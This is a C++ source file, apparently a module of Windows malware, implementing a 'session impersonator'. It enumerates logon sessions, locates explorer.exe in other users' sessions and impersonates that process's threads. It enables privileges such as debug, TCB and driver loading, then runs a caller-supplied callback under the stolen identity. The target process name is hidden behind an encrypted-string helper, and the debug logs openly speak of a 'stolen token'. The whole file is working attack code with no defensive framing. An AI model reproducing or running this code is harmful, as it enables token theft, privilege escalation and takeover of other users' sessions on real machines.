#include "impersonator.hpp"
#include "strings.hpp"

// именно в таком порядке из-за redefine проблем
#include <LM.h>
#include <ntsecapi.h>
#include "ntos.h"
#include "ntstatus.h"


static PVOID SfuGetSystemInfo(
	_In_ SYSTEM_INFORMATION_CLASS InfoClass
)
{
	INT			c = 0;
	LPBYTE		Buffer = NULL;
	ULONG		Size = 0x1000;
	NTSTATUS	status;
	ULONG       memIO;

	do {
		Buffer = new BYTE[Size];
		if (Buffer != NULL) {
			status = NtQuerySystemInformation(InfoClass, Buffer, Size, &memIO);
		}
		else {
			return NULL;
		}
		if (status == STATUS_INFO_LENGTH_MISMATCH) {
			delete[]Buffer;
			Buffer = NULL;
			Size *= 2;
			c++;
			if (c > 100) {
				status = STATUS_SECRET_TOO_LONG;
				break;
			}
		}
	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	if (NT_SUCCESS(status)) {
		return Buffer;
	}

	if (Buffer) {
		delete[]Buffer;
	}
	return NULL;
}


/*
* SfuAdjustCurrentThreadPriv
*
* Purpose:
*
* Impersonate thread and adjust privileges.
*
*/
static BOOL SfuAdjustCurrentThreadPriv(
	PCLIENT_ID SourceThread
)
{
	BOOL                         cond = FALSE;
	NTSTATUS                     status = STATUS_UNSUCCESSFUL;
	HANDLE			             hThread = NULL, hToken = NULL;
	OBJECT_ATTRIBUTES            obja;
	SECURITY_QUALITY_OF_SERVICE  SecurityQos;
	TOKEN_PRIVILEGES             *NewState = NULL;
	ULONG                        uLen;

	do {

		InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
		status = NtOpenThread(&hThread, THREAD_DIRECT_IMPERSONATION, &obja, SourceThread);
		if (!NT_SUCCESS(status))
			break;

		SecurityQos.Length = sizeof(SecurityQos);
		SecurityQos.ImpersonationLevel = SecurityImpersonation;
		SecurityQos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
		SecurityQos.EffectiveOnly = FALSE;
		status = NtImpersonateThread(NtCurrentThread(), hThread, &SecurityQos);
		if (!NT_SUCCESS(status))
			break;

		status = NtOpenThreadTokenEx(NtCurrentThread(), TOKEN_ADJUST_PRIVILEGES, FALSE, 0, &hToken);
		if (!NT_SUCCESS(status))
			break;

		uLen = sizeof(TOKEN_PRIVILEGES) + (6 * sizeof(LUID_AND_ATTRIBUTES));

		NewState = (TOKEN_PRIVILEGES*)new BYTE[uLen];
		if (NewState == NULL)
			break;

		NewState->PrivilegeCount = 6;

		NewState->Privileges[0].Luid.LowPart = SE_TCB_PRIVILEGE;
		NewState->Privileges[0].Luid.HighPart = 0;
		NewState->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED_BY_DEFAULT | SE_PRIVILEGE_ENABLED;

		NewState->Privileges[1].Luid.LowPart = SE_TAKE_OWNERSHIP_PRIVILEGE;
		NewState->Privileges[1].Luid.HighPart = 0;
		NewState->Privileges[1].Attributes = SE_PRIVILEGE_ENABLED_BY_DEFAULT | SE_PRIVILEGE_ENABLED;

		NewState->Privileges[2].Luid.LowPart = SE_RESTORE_PRIVILEGE;
		NewState->Privileges[2].Luid.HighPart = 0;
		NewState->Privileges[2].Attributes = SE_PRIVILEGE_ENABLED_BY_DEFAULT | SE_PRIVILEGE_ENABLED;

		NewState->Privileges[3].Luid.LowPart = SE_DEBUG_PRIVILEGE;
		NewState->Privileges[3].Luid.HighPart = 0;
		NewState->Privileges[3].Attributes = SE_PRIVILEGE_ENABLED_BY_DEFAULT | SE_PRIVILEGE_ENABLED;

		NewState->Privileges[4].Luid.LowPart = SE_LOAD_DRIVER_PRIVILEGE;
		NewState->Privileges[4].Luid.HighPart = 0;
		NewState->Privileges[4].Attributes = SE_PRIVILEGE_ENABLED_BY_DEFAULT | SE_PRIVILEGE_ENABLED;

		NewState->Privileges[5].Luid.LowPart = SE_SECURITY_PRIVILEGE;
		NewState->Privileges[5].Luid.HighPart = 0;
		NewState->Privileges[5].Attributes = SE_PRIVILEGE_ENABLED_BY_DEFAULT | SE_PRIVILEGE_ENABLED;

		status = NtAdjustPrivilegesToken(hToken, FALSE, NewState, 0, NULL, NULL);

	} while (cond);

	if (hToken != NULL) NtClose(hToken);
	if (hThread != NULL) NtClose(hThread);
	if (NewState != NULL) delete[]NewState;

	return NT_SUCCESS(status);
}
static BOOL SfuElevatePriv(DWORD dwTargetSession, LPWSTR lpwszSessionProcess)
{
	BOOLEAN                        WasEnabled;
	BOOL                           cond = FALSE, bResult = FALSE;
	NTSTATUS                       status;
	PSYSTEM_PROCESSES_INFORMATION  ProcessList = NULL, pList;
	UNICODE_STRING                 uLookupProcess;
	ULONG                          i;


	do {
		status = RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &WasEnabled);
		if (!NT_SUCCESS(status))
			break;

		ProcessList = (PSYSTEM_PROCESSES_INFORMATION)SfuGetSystemInfo(SystemProcessInformation);
		if (ProcessList == NULL)
			break;

		RtlSecureZeroMemory((PUNICODE_STRING)&uLookupProcess, sizeof(uLookupProcess));
		RtlInitUnicodeString((PUNICODE_STRING)&uLookupProcess, lpwszSessionProcess);
		pList = ProcessList;

		for (;;) {

			if (RtlEqualUnicodeString((PCUNICODE_STRING)&uLookupProcess, (PCUNICODE_STRING)&pList->ImageName, TRUE)
				&& pList->SessionId == dwTargetSession) {

				for (i = 0; i < pList->ThreadCount; i++) {
					bResult = SfuAdjustCurrentThreadPriv(&pList->Threads[i].ClientId);
					if (bResult)
						break;
				}
				break;
			}

			if (pList->NextEntryDelta == 0) {
				break;
			}
			pList = (PSYSTEM_PROCESSES_INFORMATION)(((LPBYTE)pList) + pList->NextEntryDelta);
		}

	} while (cond);

	if (ProcessList != NULL)
		delete[]ProcessList;

	return bResult;
}

static BOOL iterateSessions(DWORD dwCount, PLUID pSessions, DWORD dwCurrentID, sessionimpersonator::thrImpersonateParam *impParameter)
{

#ifdef _DEBUG
	WCHAR debugOut[1024];
#endif

	CCryptString cStr_explorer(cryptedstr_explorer);
	NTSTATUS retval = 0;
	BOOL bRet = FALSE;
	
	for (UINT iIndex = 0; iIndex < dwCount; iIndex++)
	{
		PSECURITY_LOGON_SESSION_DATA sessionData = nullptr;

		do
		{
			retval = LsaGetLogonSessionData(&pSessions[iIndex], &sessionData);
			if (retval != STATUS_SUCCESS)
				break;

			bRet = TRUE;

			if (dwCurrentID == sessionData->Session)
			{
#ifdef _DEBUG
				wsprintfW(debugOut, L"[lpThreadImpersonator] Session %d of username %s matches current process session id, so not touching it",
					sessionData->Session,
					sessionData->UserName.Buffer);

				WriteLog(debugOut);
#endif
				break;
			}

			if (!SfuElevatePriv(sessionData->Session, cStr_explorer.w_str()))
			{
#ifdef _DEBUG
				WriteLog(L"[lpThreadImpersonator] error cant steal token");
#endif
				break;
			}

#ifdef _DEBUG
			wsprintfW(debugOut, L"[lpThreadImpersonator] stolen token of Session %d of username %s",
				sessionData->Session,
				sessionData->UserName.Buffer);

			WriteLog(debugOut);
#endif

			if ((impParameter != nullptr) && (impParameter->fnCallback != nullptr))
				impParameter->fnCallback(&impParameter->callbackParam);

		} while (FALSE);

		if (sessionData != nullptr)
			LsaFreeReturnBuffer(sessionData);
	}

	return bRet;
}

static DWORD WINAPI lpThreadImpersonator(LPVOID lpParameter)
{
	sessionimpersonator::thrImpersonateParam *impParameter = (sessionimpersonator::thrImpersonateParam*)lpParameter;

	DWORD dwCount = 0;
	PLUID pSessions = nullptr;
	BOOL bResult = FALSE;

	DWORD dwId = 0;

	do
	{
		if (!ProcessIdToSessionId(GetCurrentProcessId(), &dwId))
			break;

		if (LsaEnumerateLogonSessions(&dwCount, &pSessions) != STATUS_SUCCESS)
			break;

		iterateSessions(dwCount, pSessions, dwId, impParameter);

	} while (FALSE);

	if (pSessions != nullptr)
		LsaFreeReturnBuffer(pSessions);

	ExitThread(0);
}


sessionimpersonator::ThreadSessionImpersonator::ThreadSessionImpersonator()
{
#ifdef _DEBUG
	WriteLog(L"[ThreadSessionImpersonator] constructor");
#endif
	this->imParameter = nullptr;
}

sessionimpersonator::ThreadSessionImpersonator::~ThreadSessionImpersonator()
{
#ifdef _DEBUG
	WriteLog(L"[ThreadSessionImpersonator] destructor");
#endif
}

BOOL sessionimpersonator::ThreadSessionImpersonator::initialize(LPBYTE lpParameter, SIZE_T dwParamSize)
{
	if ((lpParameter == nullptr) || (dwParamSize != sizeof(sessionimpersonator::thrImpersonateParam)))
	{
#ifdef _DEBUG
		WriteLog(L"[ThreadSessionImpersonator::initialize] invalid parameters");
#endif
		return FALSE;
	}


	this->imParameter = (sessionimpersonator::thrImpersonateParam*)lpParameter;

	return TRUE;
}

BOOL sessionimpersonator::ThreadSessionImpersonator::impersonate()
{
	if ((this->imParameter == nullptr) || (this->imParameter->fnCallback == nullptr))
	{
#ifdef _DEBUG
		WriteLog(L"[ThreadSessionImpersonator::impersonate] invalid parameters");
#endif
		return FALSE;
	}

#ifdef _DEBUG
	WriteLog(L"[ThreadSessionImpersonator::impersonate] impersonating threads...");
#endif

	BOOL bRet = FALSE;
	HANDLE hImpersonateThread = NULL;
	do
	{
		if (this->imParameter->bInvokeNoImp)
			this->imParameter->fnCallback(&this->imParameter->callbackParam);

		
		hImpersonateThread = CreateThread(NULL, NULL, lpThreadImpersonator, this->imParameter, NULL, NULL);
		if (hImpersonateThread == NULL)
		{
#ifdef _DEBUG
			WriteLog(L"[ThreadSessionImpersonator::impersonate] error creating impersonating thread");
#endif
			break;
		}

		if (WaitForSingleObject(hImpersonateThread, INFINITE) == WAIT_FAILED)
		{
#ifdef _DEBUG
			WriteLog(L"[ThreadSessionImpersonator::impersonate] critical error cant await for thread completion, terminating thread...");
#endif
			TerminateThread(hImpersonateThread, 0); // неизвестная ошибка - завершим поток на всякий случай, чтобы убедиться, что он не работает
			break;
		}
		

		bRet = TRUE;

	} while (FALSE);

	if (hImpersonateThread)
		CloseHandle(hImpersonateThread);

	return bRet;
}

BOOL sessionimpersonator::ThreadSessionImpersonator::revert()
{
	return TRUE;
}
